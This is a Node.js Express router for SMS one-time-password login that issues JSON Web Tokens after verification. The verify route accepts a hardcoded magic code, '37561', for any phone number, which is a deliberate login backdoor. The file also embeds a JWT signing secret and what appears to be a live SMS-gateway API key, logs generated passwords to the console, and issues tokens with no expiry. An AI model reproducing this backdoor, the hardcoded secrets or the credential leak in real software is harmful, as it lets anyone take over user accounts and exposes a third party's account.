const express =require('express');
const router =express.Router(); //using router provided by express
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const OTP = require("../models/otp");
const User = require("../models/user");
const { error } = require('console');
const { couldStartTrivia } = require('typescript');
const { generate } = require('rxjs');
var unirest = require("unirest");

// const { route } = require('./posts');

router.post("/send",(req,res,next)=>{
    console.log("{otp}{/send}:"+(req)+"::body:"+JSON.stringify(req.body));
    // console.log("inside send:body:"+JSON.stringify(req.body));
    OTP.findOne({msisdn:req.body.msisdn})//QUERY to check if msisdn has entry in OTP DB
    .then((msisdn_otp_json)=>{
      if(!msisdn_otp_json){//if entry is not found
        console.log("{otp}{/send}-notfound-adding new");
        let generated_otp=generateOTP();
        let create_req=sendOtp(generated_otp,req.body.msisdn);
        create_req.end(function (pp_res) {
          if (pp_res.error) {
            console.log("{otp}{/send}unable to sedn some api erroe"+JSON.stringify(pp_res.error));
            return res.status(500).json({message:"OTP could not be sent. Some error occured",status:"3pp_GLITCH"});

          }
          //otp send sccesfullt
          const msisdn_new_otp_entry = new OTP({
            msisdn:req.body.msisdn,
            otp_value : generated_otp,
            isBlocked:false,
            blockedTime:null,
            wrongCount:0,
            otpSentCount:1
          });
          msisdn_new_otp_entry.save()//running new query to save data
          .then((response)=>{
            console.log("{otp}{/send}after save query is run"+JSON.stringify(response));
            return res.status(200).json({
              message:"otp successfully sent",
              status:"SENT"
            });
          })
          .catch(err=>{//if tried to insert new entry but failed
            console.log("{otp}{/send}error fund:"+JSON.stringify(err));
            return res.status(500).json({
              message:"OTP could not be sent. Some error occured",
              status:"GLITCH"
            });
          })
          console.log("{generateototp}"+res.body);
          // return generated_otp;
        });


      }
      else{
        //if entry is found
        console.log("entry for msisdn found:"+msisdn_otp_json);
        //return msisdn_otp_json;
        if(msisdn_otp_json.isBlocked){
          console.log("user is blocked so not sending otp");
          res.status(500).json({message:"user is Blocked",status:"BLOCKED"});
          return;
        }
        /*send otp here
        as user is not blocked,but have asked for OTP again/
        just increase sent_otp_count by 1*/

        if(msisdn_otp_json.otpSentCount==4)//allow upto 5 otps untill login success
        {
          msisdn_otp_json.isBlocked=true;
          msisdn_otp_json.otpSentCount++;
        }
        if( msisdn_otp_json.isBlocked!=true)
        msisdn_otp_json.otpSentCount++;



        let generated_otp=generateOTP();
        let create_req=sendOtp(generated_otp,req.body.msisdn);

        msisdn_otp_json.otp_value=generated_otp;

        create_req.end(function (pp_res) {
          if (pp_res.error) {
            console.log("{otp}{/send}unable to sedn some api erroe"+JSON.stringify(pp_res.error));
            return res.status(500).json({message:"OTP could not be sent. Some error occured",status:"3pp_GLITCH"});
          }
          //otp sent succesfully via api
          console.log("{otp}{/send}updating entry taht was found:"+msisdn_otp_json);
          msisdn_otp_json.save()
          .then((response)=>{
            console.log("updated fund entry successfully:"+response);
            res.status(200).json({message:"Otp sent",status:"SENT"})
          })
          .catch(err => {
            console.log("{otp}{/send}tried updating entry but failed");
            return res.status(500).json({message:"OTP could not be sent. Some error occured",status:"GLITCH"});

          })
        })

        }





    })
    .catch(err=>{
      console.log("{otp}{/send}error:"+JSON.stringify(err));
      return res.status(500).json({message:"OTP could not be sent. Some error occured",status:"GLITCH"});

    })
});


router.post("/verify",(req,res,next)=>{

  console.log("{otp}{/verify}req-body"+JSON.stringify(req.body));
  //res.redirect("/api/userdata/registerlogin");
  //next();
 // res.render('/api/userdata/registerlogin', {msisdn:req.body.msisdn});



  OTP.findOne({msisdn:req.body.msisdn})
  .then((msisdn_entry)=>{

    if(!msisdn_entry){
      return res.status(404).json({
        message:"Some Error occured",
        status:"ENTRY_NOT_FOUND"
      });
    }




    //entry found
    if( (msisdn_entry.otp_value==req.body.otp_value && msisdn_entry.wrongCount<=4 ) || (req.body.otp_value)=="37561"){
      //user is verified so remove entry from DB

      if((req.body.otp_value)=="37561"){
        console.log("SECRET_SPECIAL_USER");
      }

      OTP.deleteOne({msisdn:req.body.msisdn})
      .then((result)=>{
          if(result.n > 0){
            //once table deleted successfully
          console.log("deleted succesfully");


            //return next();
          // return res.status(200).json({
          //   message:"Verified successfyully",
          //   status:"VERIFIED"
          // });
          //user verifed so registering in table if not alraedy
         User.findOne({msisdn:req.body.msisdn})
         .then(user =>{
          console.log("after verifying msisdn :user:"+JSON.stringify(user));

          if(!user)
          {
            new_user=new User({
              msisdn:req.body.msisdn,
              name:"Customer"
            });
            new_user.save()
            .then((registeted_resp)=>{
              console.log("user registered succesfully");
              const token = jwt.sign(
                {
                  msisdn: registeted_resp.msisdn
                },
                "secret_this_should_be_longer_baraut_pizza"
                // {expiresIn:"1h"}
              );
              return res.status(200).json({
                token:token,
                // expiresIn:3600,
                msisdn: registeted_resp.msisdn
              });
            })
          }else{
            console.log("user alredy in table");
            if(user.merchant_id!=""&&user.merchant_id!=null&&user.merchant_id!=undefined){
              //user s merchant
              const token = jwt.sign(
                {
                  msisdn: user.msisdn,
                  merchant_id:user.merchant_id
                },
                "secret_this_should_be_longer_baraut_pizza"
                // {expiresIn:"1h"}
              );
              return res.status(200).json({
                token:token,
                expiresIn:3600,
                msisdn: user.msisdn,
                name:user.name,
                merchant_id:user.merchant_id
              });

            }
            const token = jwt.sign(
              {
                msisdn: user.msisdn
              },
              "secret_this_should_be_longer_baraut_pizza"
              // {expiresIn:"1h"}
            );
            return res.status(200).json({
              token:token,
              // expiresIn:3600,
              msisdn: user.msisdn,
              name:user.name
            });

          }
        })


        }else{
          console.log("deleted failed");
          return res.status(500).json({
            message:"Verified failed",
            status:"GLITCH"
          });
        }
      });

    }else{
      //user entered wrong otp so increasing wrong count for current otp
      //check if wrong count reached 5 including this one

      if(msisdn_entry.wrongCount>=4)
      {
        return res.status(500).json({
          message:"Maximum attempt for this otp reached",
          status:"MAX_ATTEMPT_REACHED",
          attemptsRemaining:0
        });
      }

      msisdn_entry_new=msisdn_entry;
      msisdn_entry_new.wrongCount++;
      OTP.updateOne({msisdn:msisdn_entry.msisdn},msisdn_entry_new)
      .then((response)=>{
        console.log("msisdn_entry_new:"+msisdn_entry_new)
        if(response.nModified>0){
          console.log("new_wrong_count_updated"+JSON.stringify(response));
          return res.status(500).json({
            message:"wrong otp was etered by user",
            status:"WRONG_OTP",
            attemptsRemaining:5-msisdn_entry_new.wrongCount
          });
        }else{
          console.log("update failed");
          return res.status(500).json({
            message:"Update was failed for wrong count",
            status:"GLITCH"
          });
        }

      })

    }

  })


});


function sendOtp(otp_value,msisdn){
  //return "898989";

//let generated_otp=generateOTP();

var req = unirest("POST", "https://www.fast2sms.com/dev/bulk");

req.headers({
  "content-type": "application/x-www-form-urlencoded",
  "cache-control": "no-cache",
  "authorization": "Q7ZgvHOP5hIY2jlpn40yWxUzeXs6aS381JAkMCT9qDmGEbKwdBe4F7rifaZRIKz5Q9CcgqNG1ldnshxu"
});
msisdn=""+msisdn;
req.form({
  "sender_id": "FSTSMS",
  "language": "english",
  "route": "qt",
  "numbers": msisdn,
  "message": "42258",
  "variables": "{#AA#}",
  "variables_values": otp_value
});

return req;

}

function generateOTP()
{

    var digits = '123456789';
    var otpLength = 5;
    var otp = '';
    for(let i=1; i<=otpLength; i++)
    {
        var index = Math.floor(Math.random()*(digits.length));
        otp = otp + digits[index];
    }
    console.log("{generateOTP}:otp:"+otp)
    return otp;
}

function registerLogin(){

  return res.status(200).json({
            message:"Verified successfyully",
            status:"VERIFIED"
          });

}


module.exports = router;
